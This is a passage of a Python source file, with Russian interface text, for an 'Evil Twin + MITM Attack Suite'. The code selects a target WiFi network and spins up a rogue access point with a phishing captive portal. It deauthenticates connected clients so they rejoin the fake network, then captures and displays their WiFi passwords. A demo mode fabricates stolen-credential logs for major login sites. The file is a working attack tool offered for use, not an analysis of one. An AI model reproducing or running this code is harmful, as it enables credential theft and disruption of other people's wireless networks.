    print(f"\n{Colors.ORANGE}[*] Включение Monitor Mode на {deauth_interface}...{Colors.RESET}")
    NetworkInterface.enable_monitor_mode(deauth_interface)
    deauth_interface += 'mon'
    time.sleep(2)

    # Сканирование сетей
    scanner = APScanner(deauth_interface)

    def signal_handler(sig, frame):
        scanner.stop_scan = True

    original_sigint = signal.signal(signal.SIGINT, signal_handler)
    networks = scanner.scan()
    signal.signal(signal.SIGINT, original_sigint)

    if not networks:
        print(f"\n{Colors.ORANGE}[!] Сети не найдены{Colors.RESET}")
        input(f"\n{Colors.WHITE}Нажмите Enter для возврата...{Colors.RESET}")
        return

    # Выбор цели
    print(f"\n{Colors.WHITE}Введите номер целевой сети: {Colors.RESET}", end='')
    target_choice = input()

    try:
        target = networks[int(target_choice) - 1]
    except:
        print(f"{Colors.ORANGE}[!] Неверный выбор{Colors.RESET}")
        time.sleep(2)
        return

    # Запуск атаки
    print(f"\n{Colors.ORANGE}[*] Запуск Evil Twin атаки на {target['ssid']}...{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Используется шаблон: {selected_template}{Colors.RESET}")
    time.sleep(2)

    attack = EvilTwinAttack(ap_interface, deauth_interface, target)

    # Создаем фишинговый портал
    print(f"{Colors.ORANGE}[*] Создание фишингового портала...{Colors.RESET}")
    attack.create_html_portal(selected_template)

    # Настраиваем точку доступа
    print(f"{Colors.ORANGE}[*] Настройка Evil Twin AP...{Colors.RESET}")
    attack.setup_ap()

    # Запускаем сервисы
    print(f"{Colors.ORANGE}[*] Запуск сервисов...{Colors.RESET}")
    attack.start_services()

    print(f"{Colors.WHITE}[*] Ожидание 10 секунд...{Colors.RESET}")
    time.sleep(10)

    # Получаем клиентов
    print(f"{Colors.ORANGE}[*] Сканирование клиентов...{Colors.RESET}")
    attack.clients = attack.get_clients()
    print(f"{Colors.WHITE}[*] Найдено клиентов: {len(attack.clients)}{Colors.RESET}")

    # Запускаем деаутентификацию и мониторинг
    stop_deauth = threading.Event()
    deauth_thread = threading.Thread(target=attack.deauth_clients, args=(stop_deauth,))
    deauth_thread.start()

    monitor_thread = threading.Thread(target=attack.monitor_passwords, args=(stop_deauth,))
    monitor_thread.start()

    # Отображение логов в реальном времени (дизайн из main.py)
    animation_frame = 0
    try:
        while not attack.attack_successful:
            os.system('clear')

            try:
                terminal_size = os.get_terminal_size()
                terminal_width = terminal_size.columns
                terminal_height = terminal_size.lines
            except:
                terminal_width = 120
                terminal_height = 30

            total_width = terminal_width - 4
            box_width = (total_width - 3) // 2
            section_height = min(terminal_height - 10, 20)

            left_top = '╭' + '─' * box_width + '╮'
            right_top = '╭' + '─' * box_width + '╮'

            def diagonal_gradient(text, row, total_rows):
                result = ""
                for i, char in enumerate(text):
                    diag_pos = (row / total_rows + i / len(text)) / 2
                    color_idx = int(diag_pos * (len(Colors.CLAUDE_COLORS) - 1))
                    color_idx = min(color_idx, len(Colors.CLAUDE_COLORS) - 1)
                    result += Colors.CLAUDE_COLORS[color_idx] + char
                return result + Colors.RESET

            total_rows = section_height + 4

            print(f"\n{diagonal_gradient(left_top, 0, total_rows)} {diagonal_gradient(right_top, 0, total_rows)}")

            deauth_title = "DEAUTH LOGS"
            ap_title = "AP LOGS"
            deauth_padding = (box_width - len(deauth_title)) // 2
            ap_padding = (box_width - len(ap_title)) // 2

            left_header = f"│{' ' * deauth_padding}{deauth_title}{' ' * (box_width - len(deauth_title) - deauth_padding)}│"
            right_header = f"│{' ' * ap_padding}{ap_title}{' ' * (box_width - len(ap_title) - ap_padding)}│"

            print(f"{diagonal_gradient(left_header, 1, total_rows)} {diagonal_gradient(right_header, 1, total_rows)}")

            left_mid = '├' + '─' * box_width + '┤'
            right_mid = '├' + '─' * box_width + '┤'
            print(f"{diagonal_gradient(left_mid, 2, total_rows)} {diagonal_gradient(right_mid, 2, total_rows)}")

            for i in range(section_height):
                row_num = 3 + i

                log_index = len(deauth_log) - section_height + i
                if log_index >= 0 and log_index < len(deauth_log):
                    left_log = deauth_log[log_index]
                    if len(left_log) > box_width - 2:
                        left_log = left_log[:box_width - 5] + "..."
                else:
                    left_log = ""

                left_padding = box_width - len(left_log) - 2

                log_index = len(ap_log) - section_height + i
                if log_index >= 0 and log_index < len(ap_log):
                    right_log = ap_log[log_index]
                    if len(right_log) > box_width - 2:
                        right_log = right_log[:box_width - 5] + "..."
                else:
                    right_log = ""

                right_padding = box_width - len(right_log) - 2

                left_border_start = diagonal_gradient('│', row_num, total_rows)
                left_border_end = diagonal_gradient('│', row_num, total_rows)
                right_border_start = diagonal_gradient('│', row_num, total_rows)
                right_border_end = diagonal_gradient('│', row_num, total_rows)

                print(f"{left_border_start} {Colors.WHITE}{left_log}{' ' * left_padding} {left_border_end} {right_border_start} {Colors.WHITE}{right_log}{' ' * right_padding} {right_border_end}")

            deauth_status_animated = Colors.animate_gradient(attack.deauth_status, animation_frame)
            ap_status_animated = Colors.animate_gradient(attack.ap_status, animation_frame)

            row_num = 3 + section_height
            print(f"{diagonal_gradient(left_mid, row_num, total_rows)} {diagonal_gradient(right_mid, row_num, total_rows)}")

            row_num += 1
            deauth_status_padding = box_width - len(attack.deauth_status) - 2
            ap_status_padding = box_width - len(attack.ap_status) - 2

            left_status_line = f"│ {attack.deauth_status}{' ' * deauth_status_padding} │"
            right_status_line = f"│ {attack.ap_status}{' ' * ap_status_padding} │"

            left_status_colored = ""
            for i, char in enumerate(left_status_line):
                if char in '│':
                    left_status_colored += diagonal_gradient(char, row_num, total_rows)
                elif i > 1 and i < len(left_status_line) - 2:
                    color_idx = (i + animation_frame) % len(Colors.CLAUDE_COLORS)
                    left_status_colored += Colors.CLAUDE_COLORS[color_idx] + char
                else:
                    left_status_colored += char

            right_status_colored = ""
            for i, char in enumerate(right_status_line):
                if char in '│':
                    right_status_colored += diagonal_gradient(char, row_num, total_rows)
                elif i > 1 and i < len(right_status_line) - 2:
                    color_idx = (i + animation_frame) % len(Colors.CLAUDE_COLORS)
                    right_status_colored += Colors.CLAUDE_COLORS[color_idx] + char
                else:
                    right_status_colored += char

            print(f"{left_status_colored}{Colors.RESET} {right_status_colored}{Colors.RESET}")

            row_num += 1
            left_bottom = '╰' + '─' * box_width + '╯'
            right_bottom = '╰' + '─' * box_width + '╯'
            print(f"{diagonal_gradient(left_bottom, row_num, total_rows)} {diagonal_gradient(right_bottom, row_num, total_rows)}")

            print(f"\n{Colors.DIM}Press Ctrl+C to stop attack{Colors.RESET}")

            animation_frame = (animation_frame + 1) % len(Colors.CLAUDE_COLORS)
            attack.animation_frame = animation_frame

            time.sleep(0.2)

    except KeyboardInterrupt:
        pass

    # Остановка атаки
    print(f"\n\n{Colors.ORANGE}[*] Остановка атаки...{Colors.RESET}")
    stop_deauth.set()
    deauth_thread.join(timeout=3)
    monitor_thread.join(timeout=3)

    # Очистка
    subprocess.run(['killall', 'hostapd'], stderr=subprocess.DEVNULL)
    subprocess.run(['killall', 'dnsmasq'], stderr=subprocess.DEVNULL)
    NetworkInterface.disable_monitor_mode(deauth_interface)

    # Показываем результаты
    show_attack_results(attack, target, selected_template)


def show_attack_results(attack, target, template):
    """Показать результаты атаки"""
    os.system('clear')

    print(f"\n{Colors.gradient('='*80, style='claude')}")
    print(f"{Colors.ORANGE}{'ATTACK RESULTS':^80}{Colors.RESET}")
    print(f"{Colors.gradient('='*80, style='claude')}\n")

    print(f"{Colors.ORANGE}Target Information:{Colors.RESET}")
    print(f"  {Colors.WHITE}SSID:       {target['ssid']}{Colors.RESET}")
    print(f"  {Colors.WHITE}BSSID:      {target['bssid']}{Colors.RESET}")
    print(f"  {Colors.WHITE}Channel:    {target['channel']}{Colors.RESET}")
    print(f"  {Colors.WHITE}Encryption: {target.get('encryption', 'N/A')}{Colors.RESET}")
    print(f"  {Colors.WHITE}Template:   {template}{Colors.RESET}\n")

    if attack.attack_successful and attack.correct_password:
        print(f"{Colors.gradient('╭' + '─' * 78 + '╮', style='claude')}")
        print(f"{Colors.ORANGE}│{Colors.WHITE}{'SUCCESS! PASSWORD CRACKED':^78}{Colors.ORANGE}│{Colors.RESET}")
        print(f"{Colors.gradient('├' + '─' * 78 + '┤', style='claude')}")
        print(f"{Colors.ORANGE}│{Colors.WHITE}  Password: {attack.correct_password}{' ' * (76 - len(attack.correct_password) - 12)}{Colors.ORANGE}│{Colors.RESET}")
        print(f"{Colors.gradient('╰' + '─' * 78 + '╯', style='claude')}")
    else:
        print(f"{Colors.ORANGE}Status: Attack stopped (no password captured){Colors.RESET}\n")

    print(f"{Colors.ORANGE}Statistics:{Colors.RESET}")
    print(f"  {Colors.WHITE}Captured passwords: {len(captured_passwords)}{Colors.RESET}")
    print(f"  {Colors.WHITE}Deauth attempts:    {len(deauth_log)}{Colors.RESET}")
    print(f"  {Colors.WHITE}AP events:          {len(ap_log)}{Colors.RESET}\n")

    if captured_passwords:
        print(f"{Colors.ORANGE}All Captured Passwords:{Colors.RESET}")
        for i, pwd_line in enumerate(captured_passwords[:10], 1):
            print(f"  {Colors.WHITE}[{i}] {pwd_line}{Colors.RESET}")
        if len(captured_passwords) > 10:
            print(f"  {Colors.DIM}... and {len(captured_passwords) - 10} more{Colors.RESET}\n")

    print(f"{Colors.gradient('='*80, style='claude')}\n")
    input(f"{Colors.WHITE}Нажмите Enter для возврата в меню...{Colors.RESET}")


# ============================================================================
# ETHERNET / MITM ФУНКЦИИ (из new.py)
# ============================================================================

def generate_demo_creds():
    """Генерация фейковых кредов для demo"""
    usernames = ['john.doe@gmail.com', 'alice_smith', 'bob.johnson@yahoo.com', 'admin', 'user123']
    passwords = ['Password123!', 'qwerty2024', 'letmein', 'admin1234', 'MyP@ssw0rd']
    ips = [f'10.0.0.{random.randint(10, 99)}' for _ in range(5)]

    with open(creds_file, 'a') as f:
        for _ in range(3):
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            user = random.choice(usernames)
            pwd = random.choice(passwords)
            ip = random.choice(ips)
            f.write(f"{timestamp} | IP: {ip} | User: {user} | Pass: {pwd}\n")
            time.sleep(0.5)


def generate_demo_http_log():
    """Генерация фейкового HTTP лога для demo"""
    urls = ['login.facebook.com', 'accounts.google.com', 'mail.yahoo.com', 'login.live.com', 'signin.amazon.com']

    with open(http_log, 'a') as f:
        for _ in range(3):
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            src = f'10.0.0.{random.randint(10, 99)}'
            dst = f'{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}'
            url = random.choice(urls)

            log = f"\n{'='*60}\n[{timestamp}] HTTP Credentials Detected!\n"
            log += f"Source: {src} -> Destination: {dst}\n"
            log += f"POST /{url} HTTP/1.1\n"
            log += f"username=demo_user&password=demo_pass123\n"
            log += f"{'='*60}\n"

            f.write(log)
            print(f"{Colors.RED}[!] Перехвачены креды: {src} -> {url}{Colors.RESET}")
            time.sleep(1)


def cleanup():
    """Очистка после атаки"""
    global running, processes

    print(f"\n{Colors.YELLOW}[*] Останавливаю атаку...{Colors.RESET}")
    running = False

    if DEMO_MODE:
        print(f"{Colors.CYAN}[DEMO] Cleanup completed{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Креды: {creds_file}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] HTTP лог: {http_log}{Colors.RESET}")
        return

    for p in processes:
        try:
            p.terminate()
            p.wait(timeout=3)
        except:
            try:
                p.kill()
            except:
                pass

    if monitor_interface:
        subprocess.run(['airmon-ng', 'stop', monitor_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    subprocess.run(['iptables', '-F'])
    subprocess.run(['iptables', '-t', 'nat', '-F'])
    subprocess.run(['service', 'network-manager', 'restart'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"{Colors.GREEN}[+] Очистка завершена{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Креды сохранены в: {creds_file}{Colors.RESET}")
    print(f"{Colors.CYAN}[*] HTTP лог: {http_log}{Colors.RESET}")


def main():
    """Главная функция"""
    global current_page, interface, monitor_interface, target_bssid, target_channel, target_ssid

    print(f"\n{Colors.ORANGE}[*] Evil Twin + MITM Attack Suite{Colors.RESET}")
    if DEMO_MODE:
        print(f"{Colors.CYAN}[*] Running in DEMO mode{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Initializing...{Colors.RESET}\n")
    time.sleep(1)

    while True:
        try:
            show_current_page()

            print(f"\n{Colors.YELLOW}Выбери опцию (или 'tab' для переключения): {Colors.RESET}", end='')
            choice = input().strip().lower()

            if choice == 'tab':
                current_page = 1 - current_page
                continue

            try:
                choice_num = int(choice)

                if current_page == 0:  # WiFi страница
                    if choice_num == 1:
                        interfaces = NetworkInterface.get_interfaces()
                        if not interfaces:
                            print(f"{Colors.RED}[!] Не найдено WiFi интерфейсов{Colors.RESET}")
                            time.sleep(2)
                            continue

                        print(f"{Colors.YELLOW}[*] Доступные интерфейсы:{Colors.RESET}")
                        for i, iface in enumerate(interfaces, 1):
                            print(f"  {Colors.WHITE}[{i}] {iface}{Colors.RESET}")

                        try:
                            sel = int(input(f"{Colors.GREEN}Выбери номер: {Colors.RESET}")) - 1
                            interface = interfaces[sel]
                            print(f"{Colors.GREEN}[+] Выбран: {interface}{Colors.RESET}")
                            time.sleep(1)

                            NetworkInterface.enable_monitor_mode(interface)
                            monitor_interface = interface + 'mon'

                            scanner = APScanner(monitor_interface)
                            networks = scanner.scan()

                            if networks:
                                print(f"\n{Colors.WHITE}Введите номер целевой сети: {Colors.RESET}", end='')
                                tgt = int(input()) - 1
                                target_bssid = networks[tgt]['bssid']
                                target_channel = networks[tgt]['channel']
                                target_ssid = networks[tgt]['ssid']
                                print(f"{Colors.GREEN}[+] Цель: {target_ssid}{Colors.RESET}")
                                time.sleep(1)
                        except Exception as e:
                            print(f"{Colors.RED}[!] Ошибка: {e}{Colors.RESET}")
                            time.sleep(2)

                    elif choice_num == 2:
                        if not target_ssid:
                            print(f"{Colors.RED}[!] Сначала выбери сеть (опция 1){Colors.RESET}")
                            time.sleep(2)
                            continue
                        run_evil_twin_attack()

                    elif choice_num == 3:
                        if os.path.exists(creds_file):
                            subprocess.run(['cat', creds_file])
                        else:
                            print(f"{Colors.RED}[!] Креды пока не перехвачены{Colors.RESET}")
                        input(f"\n{Colors.YELLOW}Нажми Enter...{Colors.RESET}")

                    elif choice_num == 4:
                        if os.path.exists(http_log):
                            subprocess.run(['cat', http_log])
                        else:
                            print(f"{Colors.RED}[!] HTTP лог пуст{Colors.RESET}")
                        input(f"\n{Colors.YELLOW}Нажми Enter...{Colors.RESET}")

                else:  # Ethernet страница
                    if choice_num == 1 or choice_num == 5:
                        print(f"{Colors.YELLOW}[*] ARP Spoofing - в разработке{Colors.RESET}")
                        time.sleep(2)

                    elif choice_num == 2:
                        if DEMO_MODE:
                            print(f"{Colors.YELLOW}[DEMO] HTTP/HTTPS Sniffer{Colors.RESET}")
                            print(f"{Colors.GREEN}[+] Интерфейс: {demo_eth_interface}{Colors.RESET}")
                            print(f"{Colors.YELLOW}[*] Запускаю сниффер...{Colors.RESET}")
                            print(f"{Colors.RED}[!] Ctrl+C для остановки{Colors.RESET}\n")
                            try:
                                running = True
                                while running:
                                    time.sleep(2)
                                    if random.random() > 0.7:
                                        generate_demo_http_log()
                            except KeyboardInterrupt:
                                running = False
                        else:
                            print(f"{Colors.YELLOW}[*] HTTP/HTTPS Sniffer - в разработке{Colors.RESET}")
                            time.sleep(2)

                    elif choice_num == 3:
                        print(f"{Colors.YELLOW}[*] DNS Spoofing - в разработке{Colors.RESET}")
                        time.sleep(2)

                    elif choice_num == 4:
                        if os.path.exists(http_log):
                            subprocess.run(['cat', http_log])
                        else:
                            print(f"{Colors.RED}[!] Перехваченных данных нет{Colors.RESET}")
                        input(f"\n{Colors.YELLOW}Нажми Enter...{Colors.RESET}")

            except ValueError:
                print(f"{Colors.RED}[!] Неверный выбор{Colors.RESET}")
                time.sleep(1)

        except KeyboardInterrupt:
            cleanup()
            break
        except Exception as e:
            print(f"{Colors.RED}[!] Ошибка: {e}{Colors.RESET}")
            time.sleep(2)


if __name__ == '__main__':
    signal.signal(signal.SIGINT, lambda s, f: None)
    try:
        main()
    except KeyboardInterrupt:
        cleanup()
    except Exception as e:
        print(f"{Colors.RED}[!] Критическая ошибка: {e}{Colors.RESET}")
        cleanup()
